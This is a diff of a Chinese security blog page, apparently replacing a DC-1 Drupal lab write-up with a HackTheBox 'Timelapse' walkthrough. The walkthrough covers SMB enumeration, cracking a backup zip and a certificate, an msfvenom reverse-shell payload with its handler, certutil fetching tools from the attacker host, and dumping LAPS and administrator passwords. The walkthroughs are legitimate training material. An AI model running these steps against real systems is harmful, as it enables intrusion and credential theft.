@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>DC-1 | 老白</title>
+        <title>HackTheBox-Timelapse | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,54 +49,94 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">DC-1</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-11-13 19:27:09">2021-11-13 / 1 min read</div>
+                                    <div class="post-title  mdui-m-b-1">HackTheBox-Timelapse</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-04-21 21:07:59">2022-04-21 / 2 min read</div>
                                     <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="目标">目标</h1>
-<p>  DC-1 172.16.70.139</p>
+<p> Timelapse 10.129.227.113</p>
 <h1 id="过程">过程</h1>
-<p> 端口扫描<br>
- <code>nmap -A -T4 -sV -O -p- 172.16.70.139</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1649935761354.png" alt="" loading="lazy"><br>
- 爆一下目录<br>
- <code>dirb http://172.16.70.139</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1649935838945.png" alt="" loading="lazy"><br>
- 啥也没有，访问下web<br>
- <code>http://172.16.70.139</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1649935876288.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1649935880473.png" alt="" loading="lazy"><br>
- drupal 7，注册一下<br>
-<img src="https://V-alkoinen.github.io/post-images/1649935909246.png" alt="" loading="lazy"><br>
- 发现需要后台验证，直接找exp<br>
- <code>curl https://raw.githubusercontent.com/firefart/CVE-2018-7600/master/poc.py -o exp2.py</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1649935949442.png" alt="" loading="lazy"></p>
-<pre><code>nc -nvlp 9999
-python3 exp2.py
+<p> 信息收集</p>
+<pre><code>nmap -A -T4 -sV -O -p- 10.129.227.113
+smbmap -u guest -p &quot;&quot; -H 10.129.227.113
 </code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1649935974433.png" alt="" loading="lazy"><br>
- 试一下suid</p>
-<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid.py
-chmod +x suid.py
-python suid.py
+<p><img src="https://V-alkoinen.github.io/post-images/1650546777556.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650546790039.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650546859290.png" alt="" loading="lazy"><br>
+ 看到 ipc$ 和 Shares目录可以连接</p>
+<pre><code>smbclient //10.129.227.113/ipc$ -U guest%
+smbclient //10.129.227.113/Shares -U guest%
 </code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1649936017446.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1649936022620.png" alt="" loading="lazy"><br>
- find提权</p>
-<pre><code>touch 1
-find 1 -exec 'whoami' \;
-find 1 -exec '/bin/sh' \;
-find 1 -exec '/bin/bash' -q \;
+<p><img src="https://V-alkoinen.github.io/post-images/1650546922230.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650546988475.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650546992534.png" alt="" loading="lazy"><br>
+ 发现一个winrm的备份文件，直接解压需要密码，用john跑一下。</p>
+<pre><code>zip2john winrm_backup.zip &gt; hash
+john hash –wordlist=/usr/share/wordlist/rockyou.txt
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1649936103236.png" alt="" loading="lazy"></figure>
+<p><img src="https://V-alkoinen.github.io/post-images/1650547121900.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547126936.png" alt="" loading="lazy"><br>
+ 解压出来一个pfx文件，Pfx文件提取文件参考：<a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></p>
+<pre><code>python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &gt; hash1
+john --wordlist=/usr/share/wordlists/rockyou.txt ./hash1
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650547185632.png" alt="" loading="lazy"><br>
+ 密码：<code>thuglegacy</code></p>
+<pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out time.key
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out time.crt
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650547831298.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547835528.png" alt="" loading="lazy"><br>
+ <a href="https://www.speedguide.net/port.php?port=5986">https://www.speedguide.net/port.php?port=5986</a><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547867085.png" alt="" loading="lazy"><br>
+ <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547883713.png" alt="" loading="lazy"></p>
+<pre><code>gem install evil-winrm
+evil-winrm -S -i 10.129.227.113 -c time.crt -k time.key -u '' -p ''
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650547917021.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547922557.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547937148.png" alt="" loading="lazy"></p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe &gt; ./shell.exe
+upload /home/sec/laobai/timelapse/shell.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.14.6
+set lport 4444
+exploit
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650547970609.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650547974860.png" alt="" loading="lazy"><br>
+ 下载辅助提权脚本<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<pre><code>certutil.exe -urlcache -split -f http://10.10.14.6:8888/winPEASx64.exe winPEASx64.exe
+.\winPEASx64.exe &gt; ll.txt
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650548077168.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650548081491.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650548085865.png" alt="" loading="lazy"><br>
+ <Powershell history><br>
+<img src="https://V-alkoinen.github.io/post-images/1650548111391.png" alt="" loading="lazy"></p>
+<pre><code>Svc_deploy 
+E3R$Q62^12p7PLlC%KWaxuaV
+
+#使用laps脚本列出机器存储的密码
+git clone https://github.com/n00py/LAPSDumper
+python3 laps.py -u Svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650548167966.png" alt="" loading="lazy"><br>
+ pth</p>
+<pre><code>crackmapexec smb 10.129.227.113 -u administrator -p '7C@,+-v-+4$f0--h!V9]Jv#.' -X '.\Users\svc_deploy\Documents\shell.exe'
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1650548533573.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1650548538311.png" alt="" loading="lazy"></p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/dc-2/">DC-2</a></div></div>
+                                        <div class="mdui-col"> </div>
                                         
 
                                         
-                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/"> CVE-2020-27986 SonarQube未授权访问</a></div> </div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/dc-3/">DC-3</a></div> </div>
                                        
                                       </div>
                                    
